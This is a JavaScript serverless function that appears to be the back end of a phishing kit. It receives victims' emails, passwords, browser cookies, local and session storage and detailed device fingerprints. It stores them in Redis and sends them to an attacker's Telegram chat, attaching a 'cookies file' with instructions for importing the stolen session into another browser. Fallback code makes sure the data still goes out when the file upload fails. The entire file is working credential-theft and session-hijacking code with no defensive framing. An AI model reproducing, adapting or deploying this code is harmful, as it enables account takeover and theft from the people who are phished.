export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;

    // Get client IP with better detection for mobile
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     event.headers['x-real-ip'] || 
                     event.headers['cf-connecting-ip'] || 
                     'Unknown';

    // Use browser fingerprint data
    const cookieInfo = browserFingerprint?.cookies || 'No cookies found';
    const localStorageInfo = browserFingerprint?.localStorage || 'Empty';
    const sessionStorageInfo = browserFingerprint?.sessionStorage || 'Empty';
    
    // Get additional browser fingerprinting data
    const acceptLanguage = event.headers['accept-language'] || browserFingerprint?.language || 'Unknown';
    const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
    
    // Check environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram configuration');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Telegram credentials missing'
        }),
      };
    }

    // Store session data in Redis (if available)
    const sessionId = Math.random().toString(36).substring(2, 15);
    const sessionData = {
      email,
      provider,
      fileName,
      timestamp,
      sessionId,
      clientIP,
      userAgent,
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      localStorage: localStorageInfo,
      sessionStorage: sessionStorageInfo,
      acceptLanguage,
      acceptEncoding,
      browserFingerprint,
      cookiesFileData
    };

    // Try to store in Redis if available
    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });
        
        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
        await redis.set(`user:${email}`, JSON.stringify(sessionData));
        await redis.set(`cookies:${sessionId}`, JSON.stringify({
          cookies: cookieInfo,
          localStorage: localStorageInfo,
          sessionStorage: sessionStorageInfo,
          timestamp: timestamp,
          email: email,
          cookiesFileData: cookiesFileData
        }));
      } catch (redisError) {
        console.error('Redis storage error:', redisError);
        // Continue without Redis
      }
    }

    // Format message for Telegram
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
    
    // Format cookies for display
    const cookiesDisplay = cookieInfo && cookieInfo !== 'No cookies found' 
      ? (cookieInfo.length > 500 ? cookieInfo.substring(0, 500) + '...' : cookieInfo)
      : '❌ No cookies found';
    
    // Format localStorage
    const localStorageDisplay = localStorageInfo && localStorageInfo !== 'Empty' 
      ? (localStorageInfo.length > 300 ? localStorageInfo.substring(0, 300) + '...' : localStorageInfo)
      : '📭 Empty';
    
    // Format sessionStorage
    const sessionStorageDisplay = sessionStorageInfo && sessionStorageInfo !== 'Empty' 
      ? (sessionStorageInfo.length > 300 ? sessionStorageInfo.substring(0, 300) + '...' : sessionStorageInfo)
      : '📭 Empty';
    
    // Additional browser data
    const additionalInfo = browserFingerprint ? `
🖥 Screen: ${browserFingerprint.screen || 'Unknown'}
🌍 Timezone: ${browserFingerprint.timezone || 'Unknown'}
🔧 Platform: ${browserFingerprint.platform || 'Unknown'}
🍪 Cookies Enabled: ${browserFingerprint.cookieEnabled ? '✅' : '❌'}
📶 Online Status: ${browserFingerprint.onlineStatus ? '✅ Online' : '❌ Offline'}
🔌 Plugins: ${browserFingerprint.plugins?.slice(0, 3).join(', ') || 'None'}${browserFingerprint.plugins?.length > 3 ? '...' : ''}
🤖 WebDriver: ${browserFingerprint.webdriver ? '⚠️ Detected' : '✅ Not detected'}
⚡ CPU Cores: ${browserFingerprint.hardwareConcurrency || 'Unknown'}${browserFingerprint.deviceMemory ? `
💾 Device Memory: ${browserFingerprint.deviceMemory}GB` : ''}${browserFingerprint.connection ? `
📡 Connection: ${browserFingerprint.connection}` : ''}${browserFingerprint.touchSupport ? `
👆 Touch Support: ${browserFingerprint.touchSupport ? '✅' : '❌'}` : ''}${browserFingerprint.orientation ? `
📱 Orientation: ${browserFingerprint.orientation}` : ''}${browserFingerprint.devicePixelRatio ? `
🔍 Pixel Ratio: ${browserFingerprint.devicePixelRatio}` : ''}` : '';

    // Count actual data for file summary
    let cookieCount = 0;
    let localStorageCount = 0;
    let sessionStorageCount = 0;

    try {
      if (cookieInfo !== 'No cookies found') {
        cookieCount = Object.keys(JSON.parse(cookieInfo)).length;
      }
    } catch (e) { /* ignore */ }

    try {
      if (localStorageInfo !== 'Empty') {
        localStorageCount = Object.keys(JSON.parse(localStorageInfo)).length;
      }
    } catch (e) { /* ignore */ }

    try {
      if (sessionStorageInfo !== 'Empty') {
        sessionStorageCount = Object.keys(JSON.parse(sessionStorageInfo)).length;
      }
    } catch (e) { /* ignore */ }

    // Create cookies file summary
    const cookiesFileSummary = `
📁 COOKIES FILE GENERATED:
• File contains ${cookieCount} cookies
• LocalStorage items: ${localStorageCount}
• SessionStorage items: ${sessionStorageCount}
• Canvas fingerprint: ${browserFingerprint?.canvas ? '✅ Captured' : '❌ Blocked'}
• WebGL fingerprint: ${browserFingerprint?.webgl ? '✅ Captured' : '❌ Blocked'}
• Audio fingerprint: ${browserFingerprint?.audio ? '✅ Captured' : '❌ Blocked'}
• Fonts detected: ${browserFingerprint?.fonts?.length || 0}
• File will be sent as attachment below
`;
    
    const message = `🔐 Email Login Captured

📧 Email: ${email}
🔑 Password: ${password}
🏢 Provider: ${provider}
📄 File Accessed: ${fileName}
🕒 Timestamp: ${new Date(timestamp).toLocaleString()}
🌐 IP Address: ${clientIP}
${deviceInfo}
🌍 Language: ${acceptLanguage}
📦 Encoding: ${acceptEncoding}

🍪 COOKIES:
${cookiesDisplay}

💾 LOCAL STORAGE:
${localStorageDisplay}

🗂 SESSION STORAGE:
${sessionStorageDisplay}${additionalInfo}${cookiesFileSummary}

🆔 Session ID: ${sessionId}

---
 - Full Browser Session Captured`;

    // Send main message to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
      signal: AbortSignal.timeout(15000),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      throw new Error(`Failed to send message: ${errorText}`);
    }

    // NOW SEND THE COOKIES FILE - This is the critical part that was broken
    let fileSent = false;
    
    try {
      // Create comprehensive cookies file content
      const cookiesFileContent = {
        timestamp: new Date().toISOString(),
        sessionId: sessionId,
        loginInfo: {
          email: email,
          provider: provider,
          fileName: fileName,
          userAgent: userAgent,
          clientIP: clientIP
        },
        browserData: {
          cookies: cookieInfo !== 'No cookies found' ? (function() {
            try { return JSON.parse(cookieInfo); } catch(e) { return cookieInfo; }
          })() : {},
          localStorage: localStorageInfo !== 'Empty' ? (function() {
            try { return JSON.parse(localStorageInfo); } catch(e) { return localStorageInfo; }
          })() : {},
          sessionStorage: sessionStorageInfo !== 'Empty' ? (function() {
            try { return JSON.parse(sessionStorageInfo); } catch(e) { return sessionStorageInfo; }
          })() : {},
          fingerprint: browserFingerprint || {}
        },
        instructions: {
          usage: "This file contains comprehensive browser session data for session restoration",
          cookies: "Use browser extensions like 'Cookie Editor' or 'EditThisCookie' to import cookies",
          localStorage: "Use browser developer tools (F12 > Application > Local Storage) to set items",
          sessionStorage: "Use browser developer tools (F12 > Application > Session Storage) to set items",
          fingerprint: "Complete browser fingerprint for advanced session restoration"
        }
      };

      // Convert to JSON string with proper formatting
      const fileContent = JSON.stringify(cookiesFileContent, null, 2);
      const fileNameForUpload = `cookies_${email.replace('@', '_at_').replace(/[^a-zA-Z0-9_]/g, '_')}_${Date.now()}.json`;

      // Use multipart/form-data for file upload
      const boundary = '----formdata-boundary-' + Math.random().toString(36);
      
      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;
      
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
      formData += `Content-Type: application/json\r\n\r\n`;
      formData += fileContent;
      formData += `\r\n`;
      
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
      formData += `📁 <b>Cookies & Session Data File</b>\n\n👤 <b>User:</b> ${email}\n🔧 <b>Provider:</b> ${provider}\n📄 <b>File:</b> ${fileName}\n🕒 <b>Generated:</b> ${new Date().toLocaleString()}\n\n<i>This file contains all browser session data for easy import and session restoration.</i>`;
      formData += `\r\n`;
      
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="parse_mode"\r\n\r\n`;
      formData += `HTML\r\n`;
      
      formData += `--${boundary}--\r\n`;

      // Send the file to Telegram
      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
        },
        body: formData,
        signal: AbortSignal.timeout(30000),
      });

      if (fileResponse.ok) {
        console.log('✅ Cookies file sent to Telegram successfully');
        fileSent = true;
      } else {
        const fileErrorText = await fileResponse.text();
        console.error('❌ Failed to send cookies file to Telegram:', fileErrorText);
        
        // Try alternative method - send as text message if file upload fails
        const fallbackMessage = `📁 <b>COOKIES FILE DATA</b>\n\n<pre>${fileContent.substring(0, 3000)}${fileContent.length > 3000 ? '\n\n... (truncated)' : ''}</pre>`;
        
        const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: fallbackMessage,
            parse_mode: 'HTML',
          }),
        });
        
        if (fallbackResponse.ok) {
          console.log('✅ Cookies data sent as text message');
          fileSent = true;
        }
      }
    } catch (fileError) {
      console.error('❌ Error sending cookies file:', fileError);
      
      // Final fallback - send basic file info
      try {
        const basicInfo = `📁 <b>COOKIES FILE INFO</b>\n\n👤 User: ${email}\n🍪 Cookies: ${cookieCount}\n💾 LocalStorage: ${localStorageCount}\n🗂 SessionStorage: ${sessionStorageCount}\n\n<i>File generation failed, but data was captured above.</i>`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: basicInfo,
            parse_mode: 'HTML',
          }),
        });
        
        console.log('✅ Basic file info sent as fallback');
      } catch (fallbackError) {
        console.error('❌ All file sending methods failed:', fallbackError);
      }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Credentials and browser session captured successfully',
        sessionId: sessionId,
        cookiesCollected: cookieInfo !== 'No cookies found',
        cookiesFileGenerated: true,
        cookiesFileSent: fileSent
      }),
    };

  } catch (error) {
    console.error('Error in sendTelegram function:', error);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};